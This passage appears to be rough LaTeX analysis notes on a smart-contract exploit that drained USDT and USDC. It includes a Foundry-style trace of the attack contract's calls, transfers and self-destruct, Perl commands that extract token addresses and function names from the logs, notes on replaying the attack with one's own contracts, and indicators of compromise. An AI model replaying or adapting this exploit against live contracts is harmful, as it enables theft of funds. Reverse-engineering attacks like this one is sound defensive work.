    │   ├─ [20881] 0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849::42c59677(000000000000000000000000aaaaaaabaaacaaadaaaeaaafaab0aab1aab2aab3000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000000000002)
    │   │   ├─ [3315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3) [staticcall]
    │   │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3) [delegatecall]
    │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [0] 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3::withdrawTokens(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0)
    │   │   │   └─ ← ()
    │   │   ├─ [3315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849) [staticcall]
    │   │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849) [delegatecall]
    │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [8817] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, 0)
    │   │   │   ├─ [8028] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, 0) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849, to: 0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, amount: 0)
    │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← ()
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2) [staticcall]
    │   │   └─ ← 0x00000000000000000000000000000000000000000000000000000000004c4b40
    │   ├─ [11601] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(0x7d9bC45a9ABDA926A7Ce63f78759dBFA9Ed72e26, 5000000 [5e6])
    │   │   ├─ emit Transfer(from: 0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, to: 0x7d9bC45a9ABDA926A7Ce63f78759dBFA9Ed72e26, amount: 5000000 [5e6])
    │   │   └─ ← ()
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2) [delegatecall]
    │   │   │   └─ ← 0x00000000000000000000000000000000000000000000000000000000004c4b40
    │   │   └─ ← 0x00000000000000000000000000000000000000000000000000000000004c4b40
    │   ├─ [11534] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(0x7d9bC45a9ABDA926A7Ce63f78759dBFA9Ed72e26, 5000000 [5e6])
    │   │   ├─ [10903] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(0x7d9bC45a9ABDA926A7Ce63f78759dBFA9Ed72e26, 5000000 [5e6]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, to: 0x7d9bC45a9ABDA926A7Ce63f78759dBFA9Ed72e26, amount: 5000000 [5e6])
    │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [5396] 0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849::killMe()
    │   │   └─ ← ()
    │   ├─ [5466] 0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2::killMe()
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    └─ ← ()

conclusion: only 1 argument, an address

\subsubsection{The Funding}

Once we have the right selector, number and type of parameters, we can parse the tokens from the traces:

\begin{lstlisting}[language=Shell]
perl -ne 'm#(0x[0-9a-fA-F]+)::transfer#i && print "$1\n"' samples/dapp-social/tests/guess.signature.2.log | sort -u
0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF
0xdAC17F958D2ee523a2206206994597C13D831ec7
perl -ne 'm#(0x[0-9a-fA-F]+)::balance#i && print "$1\n"' samples/dapp-social/tests/guess.signature.2.log | sort -u
0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF
0xdAC17F958D2ee523a2206206994597C13D831ec7
\end{lstlisting}

We see the addresses of the helper contract, USDT and USDC.

Then the process is to:

\begin{itemize}
\item{fetch all the amounts}
\item{fetch the token addresses}
\item{transfer more than the max amount to attacker and helper contracts}
\item{transfer more than the max amount to attacker and helper contracts}
\end{itemize}

\subsubsection{The Exploit}

Find the actual parameter in the traces:

\begin{lstlisting}[language=Shell]
perl -ne 'm#aAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3::(\w+)\(#i && print "$1\n"' samples/dapp-social/tests/guess.signature.2.log | sort -u
# depositTokens
# lockTokens
# withdrawTokens
# withdrawTokensWithAlt
\end{lstlisting}

This ABI can help with finding the right target address / contract.

\section{On transaction}

execute directly

setup ourselves = redeploy their helper

mutate = replace addresses with own contracts

\section{Summary}

\subsection{Selectors And Signatures}

\begin{lstlisting}[language=Solidity]
exploit(address)
\end{lstlisting}

\subsection{Inputs}

- amounts
- addresses

\subsection{Sources}

\subsection{IOCs}

- selectors / signatures: 0x0aeb4ddf / exploit(address token)
- creates contract

\subsection{Process}

- bruteforce funding? all tokens?
